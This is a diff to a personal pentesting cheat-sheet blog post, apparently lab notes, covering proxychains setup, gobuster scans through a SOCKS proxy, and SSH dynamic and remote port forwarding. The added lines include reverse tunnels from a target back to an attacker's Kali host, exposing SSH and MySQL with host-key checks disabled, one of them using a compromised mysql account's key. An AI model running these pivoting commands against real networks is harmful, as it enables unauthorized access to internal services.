@@ -1,10 +1,15 @@
 ---
 layout: post
-title:  "networking - linux - proxychains"
+title:  "networking - linux - proxychains - port forwarding"
 date:   2022-01-01
 categories: networking
 ---
 
+### directory scan
+
+```bash
+gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://<my ip>:9050 -x .php,.txt
+```
 
 ### Configure Proxychains
 
@@ -16,7 +21,7 @@ socks5 <your VPN IP> 9050
 
 ```
 
-### Proxychains through SSH connection
+### Proxychains through SSH connection dynamic port forwarding
 
 
 ```bash
@@ -25,6 +30,18 @@ ssh -D <your VPN IP>:9050 -i id_rsa root@10.10.10.10
 
 ```
 
+## remote port forwarding two specific ports 22 and 3306 
+
+```bash
+ssh-keygen
+ssh -f -N -R 1122:<targetip>:22 -R 13306:<targetip>:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@myip -i /tmp/.ssh/id_rsa
+```
+
+## dynamic remote port forwading
+
+```bash
+ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@myip
+```
 
 ### Directory Scan through proxy
 
@@ -43,3 +60,5 @@ gobuster dir --proxy socks5://<your VPN IP>:9050 --url http://<ip> -w /usr/share
 https://abrictosecurity.com/how-to-use-proxychains/
 
 ```
+
+
